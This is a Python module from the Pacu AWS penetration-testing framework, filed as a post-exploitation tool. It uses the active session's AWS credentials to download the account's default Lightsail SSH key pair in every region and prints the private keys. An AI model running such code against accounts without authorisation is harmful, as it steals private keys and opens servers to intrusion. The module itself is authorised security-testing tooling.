#!/usr/bin/env python3
import argparse
import boto3
from functools import partial
import json

from pacu import util


module_info = {
    # Name of the module (should be the same as the filename)
    'name': 'download_lightsail_ssh_keys',

    # Name and any other notes about the author
    'author': 'Spencer Gietzen of Rhino Security Labs',

    # Category of the module. Make sure the name matches an existing category.
    'category': 'post_exploitation',

    # One liner description of the module functionality. This shows up when a user searches for modules.
    'one_liner': 'Downloads Lightsails default SSH key pairs.',

    # Description about what the module does and how it works
    'description': 'This module downloads the accounts default public and private SSH keys for AWS Lightsail.',

    # A list of AWS services that the module utilizes during its execution
    'services': ['Lightsail'],

    # For prerequisite modules, try and see if any existing modules return the data that is required for your module before writing that code yourself, that way, session data can stay separated and modular.
    'prerequisite_modules': [],

    # Module arguments to autocomplete when the user hits tab
    'arguments_to_autocomplete': [],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])


def help():
    return [module_info, parser.format_help()]


def main(args, database):
    session = util.get_active_session(database)

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = partial(util.print, session_name=session.name, database=database)
    get_regions = partial(util.get_regions, database=database)
    ######

    regions = get_regions('lightsail')

    for region in regions:
        client = boto3.client(
            'lightsail',
            region_name=region,
            aws_access_key_id=session.access_key_id,
            aws_secret_access_key=session.secret_access_key,
            aws_session_token=session.session_token
        )
        downloaded_keys = client.download_default_key_pair()
        restructured_keys = {
            'publicKey': downloaded_keys['publicKeyBase64'],
            'privateKey': downloaded_keys['privateKeyBase64']
        }
        print(f'Region: {region}\n{json.dumps(restructured_keys)}\n')

    print(f"{module_info['name']} completed.\n")
    return